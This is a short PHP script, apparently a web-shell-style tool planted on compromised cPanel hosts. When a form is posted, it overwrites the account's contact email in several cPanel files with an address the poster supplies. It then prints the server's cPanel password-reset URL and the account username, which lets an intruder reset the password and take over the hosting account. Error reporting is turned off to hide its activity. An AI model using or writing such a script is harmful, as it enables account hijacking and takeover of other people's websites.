<?php
error_reporting(0);
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	$wr = $_POST['email'];
	$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
	fwrite($f, $wr);
	fclose($f);
	$f = fopen('/home/'.$user.'/.contactinfo', 'w');
	fwrite($f, $wr);
	fclose($f);
	$f = fopen('/home/'.$user.'/.cpanels/contactinfo', 'w');
	fwrite($f, $wr);
	fclose($f);
	$f = fopen('/home/'.$user.'/.contactemail', 'w');
	fwrite($f, $wr);
	fclose($f);
	$parm = $site.':2083/resetpass?start=1';
	echo 'site x '.$parm.' x site. user x '.$user.' x user';
}
?>